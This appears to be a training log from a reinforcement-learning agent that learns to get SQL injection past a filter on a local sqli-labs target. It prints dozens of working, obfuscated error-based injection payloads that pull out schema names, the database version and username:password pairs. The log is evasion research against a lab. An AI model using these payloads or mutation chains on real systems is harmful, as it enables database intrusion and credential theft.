/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run A2C on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — A2C Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Rollout     : n_steps=5 (synchronous A3C variant)
 Seed        : 3
============================================================
  Ep   10 | SR=0% | Steps=15.0 | R=-46.00
  Ep  900 | SR=0% | Steps=15.0 | R=-45.55
  Ep  910 | SR=0% | Steps=15.0 | R=-44.77
  Ep  920 | SR=0% | Steps=15.0 | R=-44.14
  Ep  930 | SR=0% | Steps=15.0 | R=-44.44
  Ep  940 | SR=0% | Steps=15.0 | R=-42.77
  Ep  950 | SR=0% | Steps=15.0 | R=-44.39
  Ep  960 | SR=0% | Steps=15.0 | R=-45.46
  Ep  970 | SR=0% | Steps=15.0 | R=-42.98
  Ep  980 | SR=0% | Steps=15.0 | R=-44.74
  Ep  990 | SR=0% | Steps=15.0 | R=-42.89
  Ep 1000 | SR=0% | Steps=15.0 | R=-43.15
  Ep 1010 | SR=0% | Steps=15.0 | R=-44.34
  Ep 1020 | SR=0% | Steps=15.0 | R=-43.82
  Ep 1030 | SR=0% | Steps=15.0 | R=-43.16
  Ep 1040 | SR=0% | Steps=15.0 | R=-43.41
  Ep 1050 | SR=0% | Steps=15.0 | R=-43.86
  Ep 1060 | SR=0% | Steps=15.0 | R=-43.42
  Ep 1070 | SR=0% | Steps=15.0 | R=-43.05
  Ep 1080 | SR=0% | Steps=15.0 | R=-44.89
  Ep 1090 | SR=0% | Steps=15.0 | R=-42.43
  Ep 1100 | SR=0% | Steps=15.0 | R=-42.78
  Ep 1110 | SR=0% | Steps=15.0 | R=-43.05
  Ep 1120 | SR=0% | Steps=15.0 | R=-41.94
  Ep 1130 | SR=0% | Steps=15.0 | R=-42.65
  Ep 1140 | SR=0% | Steps=15.0 | R=-41.32
  Ep 1150 | SR=0% | Steps=15.0 | R=-41.22
  Ep 1160 | SR=0% | Steps=15.0 | R=-42.55
  Ep 1170 | SR=0% | Steps=15.0 | R=-43.18
  Ep 1180 | SR=0% | Steps=15.0 | R=-41.31
  Ep 1190 | SR=0% | Steps=15.0 | R=-41.83
  Ep 1200 | SR=0% | Steps=15.0 | R=-42.72
  Ep 1210 | SR=0% | Steps=15.0 | R=-42.40
  Ep 1220 | SR=0% | Steps=15.0 | R=-41.37
  Ep 1230 | SR=0% | Steps=15.0 | R=-42.98
  Ep 1240 | SR=0% | Steps=15.0 | R=-44.42
  Ep 1250 | SR=0% | Steps=15.0 | R=-43.22
  Ep 1260 | SR=0% | Steps=15.0 | R=-40.82
  Ep 1270 | SR=0% | Steps=15.0 | R=-41.12
  Ep 1280 | SR=0% | Steps=15.0 | R=-41.10
  [BYPASS] Ep 1282 | steps=15 | seq=case -> unhex_wrap -> null_byte -> case -> null_byte -> case -> hex_to_char -> between_space -> between_space -> between_space -> between_space -> case -> crlf -> crlf -> agg_swap
           payload: 1'%a0anD%a0EXP(~(SELeCT%a0*%a0From%a0(SElECT%a0((sELEcT%a0JSON_ARRAYAGG(CONCAT(taBLe_schema,CHAR(46),Table_name))%a0FRom%a0InFORMaTiOn_sCHEma.tabLes%a
  Ep 1290 | SR=10% | Steps=15.0 | R=-40.26
  Ep 1300 | SR=0% | Steps=15.0 | R=-42.00
  Ep 1310 | SR=0% | Steps=15.0 | R=-39.70
  [BYPASS] Ep 1319 | steps=14 | seq=between_space -> hex_encode -> hex_encode -> agg_swap -> ver_newline -> case -> case -> case -> case -> null_byte -> case -> case -> char_split -> func_sp_nbsp
           payload: 1'%a0aNd%a0GTID_SUBSET((DaTABASe%a0()),1);%00
  Ep 1320 | SR=10% | Steps=14.9 | R=-40.21
  Ep 1330 | SR=0% | Steps=15.0 | R=-41.01
  Ep 1340 | SR=0% | Steps=15.0 | R=-39.43
  Ep 1350 | SR=0% | Steps=15.0 | R=-39.99
  Ep 1360 | SR=0% | Steps=15.0 | R=-40.08
  Ep 1370 | SR=0% | Steps=15.0 | R=-40.38
  Ep 1380 | SR=0% | Steps=15.0 | R=-41.34
  Ep 1390 | SR=0% | Steps=15.0 | R=-39.81
  Ep 1400 | SR=0% | Steps=15.0 | R=-39.15
  Ep 1410 | SR=0% | Steps=15.0 | R=-38.95
  Ep 1420 | SR=0% | Steps=15.0 | R=-40.66
  Ep 1430 | SR=0% | Steps=15.0 | R=-40.52
  Ep 1440 | SR=0% | Steps=15.0 | R=-39.48
  Ep 1450 | SR=0% | Steps=15.0 | R=-40.19
  Ep 1460 | SR=0% | Steps=15.0 | R=-39.85
  [BYPASS] Ep 1464 | steps=6 | seq=case -> case -> case -> null_byte -> tab_space -> func_sp_nbsp
           payload: 1'%09ANd%09EXP(~(SeleCT%09*%09FrOm%09(SelEct%09(user%a0()))a));%00  *** NEW SHORTEST ***
  Ep 1470 | SR=10% | Steps=14.1 | R=-35.06
  Ep 1480 | SR=0% | Steps=15.0 | R=-40.74
  Ep 1490 | SR=0% | Steps=15.0 | R=-38.90
  [BYPASS] Ep 1499 | steps=11 | seq=case -> func_sp_nbsp -> case -> case -> newline -> case -> case -> formfeed -> case -> case -> null_byte
           payload: 1'%0aaND%0aGTID_SUBSET((DaTABase%a0()),1);%00
  Ep 1500 | SR=10% | Steps=14.6 | R=-38.09
  Ep 1510 | SR=0% | Steps=15.0 | R=-39.44
  [BYPASS] Ep 1520 | steps=12 | seq=tab_space -> hex_to_char -> case -> case -> null_byte -> hex_to_char -> null_byte -> newline -> case -> case -> null_byte -> agg_swap
           payload: 1'%09aNd%09EXP(~(SELEct%09*%09fRom%09(SELecT%09((seLECT%09JSON_ARRAYAGG(CONCAT(tABlE_schema,CHAR(46),TaBle_name))%09FRom%09inForMATIOn_sCheMA.TaBLEs%0
  Ep 1520 | SR=10% | Steps=14.7 | R=-38.69
  [BYPASS] Ep 1529 | steps=4 | seq=func_sp_nbsp -> case -> crlf -> null_byte
           payload: 1'%0d%0aAnd%0d%0aEXP(~(SElEcT%0d%0a*%0d%0afrOm%0d%0a(selEcT%0d%0a(user%a0()))a));%00  *** NEW SHORTEST ***
  Ep 1530 | SR=10% | Steps=13.9 | R=-34.73
  Ep 1540 | SR=0% | Steps=15.0 | R=-38.58
  [BYPASS] Ep 1547 | steps=9 | seq=func_sp_nl -> case -> hex_to_char -> crlf -> agg_swap -> case -> case -> newline -> null_byte
           payload: 1'%0d%0aaND%0d%0aEXP(~(seLEcT%0d%0a*%0d%0afROm%0d%0a(sElEcT%0d%0a((SElECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRoM%0d%0ainforMation_SChema.schemata))
  Ep 1550 | SR=10% | Steps=14.4 | R=-35.85
  Ep 1560 | SR=0% | Steps=15.0 | R=-39.17
  [BYPASS] Ep 1569 | steps=6 | seq=paren_full -> newline -> case -> case -> agg_swap -> null_byte
           payload: 1'%0aanD%0aEXP(~(seLecT%0a*%0aFRoM%0a(SElECT%0a((SelECT%0aJSON_ARRAYAGG(schema_name)%0afROm%0aiNfoRMatiON_SCHEMa.schemata)))a));%00
  Ep 1570 | SR=10% | Steps=14.1 | R=-35.52
  [BYPASS] Ep 1578 | steps=12 | seq=case -> unhex_wrap -> null_byte -> func_sp_tab -> null_byte -> null_byte -> hex_to_char -> case -> case -> crlf -> double_and -> agg_swap
           payload: 1'%0d%0aAND%0d%0aEXP(~(SeLECT%0d%0a*%0d%0afROM%0d%0a(sELeCt%0d%0a((SEleCT%0d%0aJSON_ARRAYAGG(CONCAT(TablE_schema,CHAR(46),TablE_name))%0d%0afrOm%0d%0a
  Ep 1580 | SR=10% | Steps=14.7 | R=-37.45
  Ep 1590 | SR=0% | Steps=15.0 | R=-41.20
  Ep 1600 | SR=0% | Steps=15.0 | R=-39.78
  Ep 1610 | SR=0% | Steps=15.0 | R=-40.69
  Ep 1620 | SR=0% | Steps=15.0 | R=-41.03
  [BYPASS] Ep 1624 | steps=4 | seq=newline -> agg_swap -> case -> null_byte
           payload: 1'%0aaNd%0aEXP(~(seLEcT%0a*%0afrOM%0a(sEleCT%0a((seLEcT%0aJSON_ARRAYAGG(schema_name)%0aFRom%0ainFormATIoN_SchEMA.schemata)))a));%00
  Ep 1630 | SR=10% | Steps=13.9 | R=-35.15
  Ep 1640 | SR=0% | Steps=15.0 | R=-40.70
  Ep 1650 | SR=0% | Steps=15.0 | R=-40.72
  Ep 1660 | SR=0% | Steps=15.0 | R=-39.36
  Ep 1670 | SR=0% | Steps=15.0 | R=-38.36
  Ep 1680 | SR=0% | Steps=15.0 | R=-40.23
  [BYPASS] Ep 1690 | steps=14 | seq=hex_to_char -> case -> case -> dbl_url_comment -> case -> tab_space -> agg_swap -> newline -> case -> agg_swap -> case -> agg_swap -> func_sp_nbsp -> null_byte
           payload: 1'%09anD%09EXP(~(SElect%09*%09FroM%09(SeleCt%09(version%a0()))a));%00
  Ep 1690 | SR=10% | Steps=14.9 | R=-37.26
  [BYPASS] Ep 1695 | steps=7 | seq=hex_to_char -> null_byte -> newline -> newline -> null_byte -> agg_swap -> case
           payload: 1'%0aANd%0aEXP(~(seLeCT%0a*%0afrom%0a(selEcT%0a((sElECt%0aJSON_ARRAYAGG(ConCAT(TaBle_schema,CHAR(46),TabLe_name))%0afrOm%0aInFormAtION_SCHEmA.tablEs%0
  Ep 1700 | SR=10% | Steps=14.2 | R=-34.74
  [BYPASS] Ep 1702 | steps=7 | seq=case -> formfeed -> case -> case -> null_byte -> case -> agg_swap
           payload: 1'%0cANd%0cEXP(~(SElECT%0c*%0cfROm%0c(SeLect%0c((SelecT%0cJSON_ARRAYAGG(schema_name)%0cfRom%0ciNFORmAtioN_scheMA.schemata)))a));%00
  Ep 1710 | SR=10% | Steps=14.2 | R=-34.46
  [BYPASS] Ep 1715 | steps=10 | seq=null_byte -> func_sp_nbsp -> tab_space -> case -> hash_nl_all -> newline -> case -> case -> case -> agg_swap
           payload: 1'%09And%09EXP(~(seLecT%09*%09From%09(SELEct%09((sElect%09JSON_ARRAYAGG(tAbLE_name)%09FRom%09inforMatiON_ScHEMa.taBLes%09WHeRe%09TaBLe_schema=DaTabASe
  [BYPASS] Ep 1717 | steps=14 | seq=case -> case -> hex_to_char -> formfeed -> ver_urlenc -> null_byte -> agg_swap -> case -> case -> hex_to_char -> null_byte -> case -> case -> func_sp_nbsp
           payload: 1'%0cAnD%0cEXP(~(SElect%0c*%0cfROM%0c(seleCt%0c(version%a0()))a));%00
  Ep 1720 | SR=20% | Steps=14.4 | R=-35.87
  Ep 1730 | SR=0% | Steps=15.0 | R=-39.30
  [BYPASS] Ep 1738 | steps=12 | seq=agg_swap -> null_byte -> null_byte -> agg_swap -> case -> case -> null_byte -> case -> case -> func_sp_nbsp -> null_byte -> crlf
           payload: 1'%0d%0aand%0d%0aEXP(~(seLECT%0d%0a*%0d%0aFrOM%0d%0a(seLect%0d%0a((seLEcT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOM%0d%0aInFORMAtiON_SChEMa.schemata))
  [BYPASS] Ep 1740 | steps=9 | seq=dbl_url_comment -> newline -> null_byte -> case -> case -> case -> case -> case -> agg_swap
           payload: 1'%0aaNd%0aEXP(~(seLect%0a*%0afRoM%0a(selECt%0a((SElEcT%0aJSON_ARRAYAGG(schema_name)%0afrOM%0aiNFoRMatIOn_SChEMa.schemata)))a));%00
  Ep 1740 | SR=20% | Steps=14.1 | R=-34.62
  [BYPASS] Ep 1742 | steps=6 | seq=hex_to_char -> agg_swap -> case -> null_byte -> case -> between_space
           payload: 1'%a0AnD%a0EXP(~(sElect%a0*%a0FRoM%a0(seLEct%a0((seLect%a0JSON_ARRAYAGG(CoNcaT(username,CHAR(58),password))%a0fRom%a0users)))a));%00
  [BYPASS] Ep 1750 | steps=11 | seq=case -> hex_to_char -> newline -> case -> formfeed -> case -> agg_swap -> null_byte -> case -> case -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(SElECt%0a*%0aFroM%0a(sElEcT%0a((sElEcT%0aJSON_ARRAYAGG(TabLe_name)%0aFrOm%0ainFoRMaTioN_SCHEMA.TablEs%0awheRe%0aTablE_schema=DaTABASE
  Ep 1750 | SR=20% | Steps=13.7 | R=-32.85
  Ep 1760 | SR=0% | Steps=15.0 | R=-40.36
  [BYPASS] Ep 1763 | steps=9 | seq=agg_swap -> between_space -> newline -> newline -> null_byte -> func_sp_nbsp -> null_byte -> newline -> case
           payload: 1'%a0aND%a0EXP(~(SELecT%a0*%a0fROm%a0(sELEcT%a0((SElecT%a0JSON_ARRAYAGG(column_name)%a0frOm%a0informAtion_ScHema.columns%a0WherE%a0TabLE_schema=daTABA
  [BYPASS] Ep 1766 | steps=4 | seq=case -> null_byte -> agg_swap -> formfeed
           payload: 1'%0canD%0cEXP(~(SelEct%0c*%0cFRoM%0c(SELeCT%0c((seLecT%0cJSON_ARRAYAGG(schema_name)%0cfrOM%0cInFoRMAtiOn_sCHemA.schemata)))a));%00
  Ep 1770 | SR=20% | Steps=13.3 | R=-32.43
  Ep 1780 | SR=0% | Steps=15.0 | R=-37.56
  Ep 1790 | SR=0% | Steps=15.0 | R=-40.03
  [BYPASS] Ep 1794 | steps=13 | seq=between_space -> gbk_bypass -> null_byte -> agg_swap -> case -> case -> null_byte -> hex_to_char -> null_byte -> case -> case -> case -> func_sp_nbsp
           payload: 1%bf%27%a0aND%a0GTID_SUBSET((DaTaBaSE%a0()),1);%00
  Ep 1800 | SR=10% | Steps=14.8 | R=-38.60
  [BYPASS] Ep 1805 | steps=9 | seq=null_byte -> newline -> case -> case -> double_or -> null_byte -> case -> case -> agg_swap
           payload: 1'%0aanD%0aEXP(~(SElEct%0a*%0aFRom%0a(sELEcT%0a((SEleCt%0aJSON_ARRAYAGG(schema_name)%0aFrOM%0ainFormation_ScheMA.schemata)))a));%00
  Ep 1810 | SR=10% | Steps=14.4 | R=-35.73
  Ep 1820 | SR=0% | Steps=15.0 | R=-43.81
  Ep 1830 | SR=0% | Steps=15.0 | R=-41.11
  [BYPASS] Ep 1838 | steps=10 | seq=hex_to_char -> newline -> null_byte -> case -> hex_to_char -> between_space -> newline -> case -> null_byte -> agg_swap
           payload: 1'%0aanD%0aEXP(~(SeLECT%0a*%0aFROm%0a(selECt%0a((selECt%0aJSON_ARRAYAGG(schema_name)%0afrom%0aiNFoRmaTioN_schEma.schemata)))a));%00
  Ep 1840 | SR=10% | Steps=14.5 | R=-38.61
  [BYPASS] Ep 1843 | steps=13 | seq=case -> func_sp_nbsp -> between_space -> case -> agg_swap -> case -> nested_or -> case -> case -> null_byte -> case -> agg_swap -> newline
           payload: 1'%0aand%0aEXP(~(seLeCt%0a*%0afroM%0a(SelECT%0a(Database%a0()))a));%00
  [BYPASS] Ep 1847 | steps=8 | seq=case -> newline -> case -> case -> agg_swap -> ident_backtick -> case -> null_byte
           payload: 1'%0aAnD%0aEXP(~(sElECt%0a*%0afrOm%0a(sELeCt%0a((SeLECT%0aJSON_ARRAYAGG(schema_name)%0aFrOM%0aINfORMaTiOn_SCheMA.schemata)))a));%00
  [BYPASS] Ep 1848 | steps=7 | seq=case -> agg_swap -> null_byte -> func_sp_nbsp -> case -> null_byte -> newline
           payload: 1'%0aAnD%0aEXP(~(seLECT%0a*%0aFRoM%0a(sElEcT%0a(version%a0()))a));%00
  Ep 1850 | SR=30% | Steps=13.3 | R=-30.84
  [BYPASS] Ep 1855 | steps=8 | seq=hex_to_char -> null_byte -> newline -> case -> newline -> case -> case -> agg_swap
           payload: 1'%0aAnD%0aEXP(~(selecT%0a*%0afrom%0a(SeleCt%0a((seleCt%0aJSON_ARRAYAGG(CONCAT(tABLE_schema,CHAR(46),tAble_name))%0afRoM%0ainForMATION_sCHema.TaBLes%0
  Ep 1860 | SR=10% | Steps=14.3 | R=-37.52
  [BYPASS] Ep 1862 | steps=6 | seq=null_byte -> case -> newline -> case -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aGTID_SUBSET((DaTabASE%a0()),1);%00
  Ep 1870 | SR=10% | Steps=14.1 | R=-36.32
  [BYPASS] Ep 1879 | steps=8 | seq=ver_newline -> case -> case -> null_byte -> crlf -> case -> case -> func_sp_nbsp
           payload: 1'%0d%0aaND%0d%0aGTID_SUBSET((version%a0()),1);%00
  Ep 1880 | SR=10% | Steps=14.3 | R=-35.79
  [BYPASS] Ep 1888 | steps=12 | seq=case -> case -> func_sp_nbsp -> null_byte -> case -> case -> ver_newline -> case -> null_byte -> case -> null_byte -> newline
           payload: 1'%0aAnD%0aEXP(~(SeLeCt%0a*%0afrOM%0a(sELEcT%0a(version%a0()))a));%00
  Ep 1890 | SR=10% | Steps=14.7 | R=-37.08
  [BYPASS] Ep 1894 | steps=7 | seq=newline -> agg_swap -> newline -> newline -> case -> hex_to_char -> null_byte
           payload: 1'%0aAnd%0aEXP(~(selECT%0a*%0aFROm%0a(SELEct%0a((selECt%0aJSON_ARRAYAGG(ConcAT(TABLe_schema,CHAR(46),tABLE_name))%0afrOm%0aInFOrmATion_schEMA.taBLes%0
  Ep 1900 | SR=10% | Steps=14.2 | R=-35.95
  Ep 1910 | SR=0% | Steps=15.0 | R=-37.44
  Ep 1920 | SR=0% | Steps=15.0 | R=-38.78
  [BYPASS] Ep 1922 | steps=12 | seq=crlf -> case -> null_byte -> case -> case -> case -> case -> case -> case -> case -> case -> func_sp_nbsp
           payload: 1'%0d%0aaNd%0d%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 1924 | steps=8 | seq=case -> case -> hex_to_char -> case -> case -> null_byte -> newline -> agg_swap
           payload: 1'%0aAnd%0aEXP(~(SELect%0a*%0aFroM%0a(SelEcT%0a((sElEcT%0aJSON_ARRAYAGG(CONCAT(TAbLE_schema,CHAR(46),taBle_name))%0afROm%0aInfORMAtION_SchEMA.TABLEs%0
  Ep 1930 | SR=20% | Steps=14.0 | R=-31.55
  [BYPASS] Ep 1935 | steps=12 | seq=newline -> case -> case -> null_byte -> null_byte -> case -> ident_backtick -> null_byte -> case -> case -> agg_swap -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(SelECT%0a*%0aFrOm%0a(seLECT%0a(version%a0()))a));%00
  [BYPASS] Ep 1937 | steps=13 | seq=hex_to_char -> agg_swap -> agg_swap -> case -> func_sp_nbsp -> null_byte -> case -> agg_swap -> case -> null_byte -> hex_to_char -> case -> newline
           payload: 1'%0aANd%0aEXP(~(sElecT%0a*%0aFrom%0a(selECT%0a(user%a0()))a));%00
  Ep 1940 | SR=20% | Steps=14.5 | R=-35.83
  Ep 1950 | SR=0% | Steps=15.0 | R=-40.04
  Ep 1960 | SR=0% | Steps=15.0 | R=-39.08
  Ep 1970 | SR=0% | Steps=15.0 | R=-39.11
  Ep 1980 | SR=0% | Steps=15.0 | R=-37.76
  [BYPASS] Ep 1985 | steps=7 | seq=case -> newline -> null_byte -> agg_swap -> case -> case -> hex_to_char
           payload: 1'%0aaND%0aEXP(~(sELEct%0a*%0afRoM%0a(SElecT%0a((SelEcT%0aJSON_ARRAYAGG(ConcAT(taBLe_schema,CHAR(46),TabLE_name))%0afrOM%0aInFOrmaTIOn_SCheMA.taBlEs%0
  Ep 1990 | SR=10% | Steps=14.2 | R=-33.61
  [BYPASS] Ep 1992 | steps=5 | seq=case -> case -> null_byte -> newline -> agg_swap
           payload: 1'%0aANd%0aEXP(~(seLEct%0a*%0aFrom%0a(sElEcT%0a((seLEcT%0aJSON_ARRAYAGG(schema_name)%0aFrOm%0aiNformATION_scHema.schemata)))a));%00
  [BYPASS] Ep 2000 | steps=12 | seq=hex_to_char -> func_sp_tab -> case -> case -> case -> newline -> null_byte -> case -> case -> case -> null_byte -> agg_swap
           payload: 1'%0aanD%0aEXP(~(selECt%0a*%0afroM%0a(seLecT%0a((SeLEct%0aJSON_ARRAYAGG(schema_name)%0aFRoM%0aInFOrmatIOn_SchEMA.schemata)))a));%00
  Ep 2000 | SR=20% | Steps=13.7 | R=-32.86
  [BYPASS] Ep 2010 | steps=9 | seq=case -> hex_to_char -> case -> null_byte -> case -> case -> agg_swap -> case -> newline
           payload: 1'%0aANd%0aEXP(~(SeLECT%0a*%0aFROM%0a(selEct%0a((SelEct%0aJSON_ARRAYAGG(CoNcAT(tablE_schema,CHAR(46),TABlE_name))%0aFRoM%0aINFORmaTION_sChEMA.tABles%0
  Ep 2010 | SR=10% | Steps=14.4 | R=-35.00
  Ep 2020 | SR=0% | Steps=15.0 | R=-39.52
  Ep 2030 | SR=0% | Steps=15.0 | R=-37.98
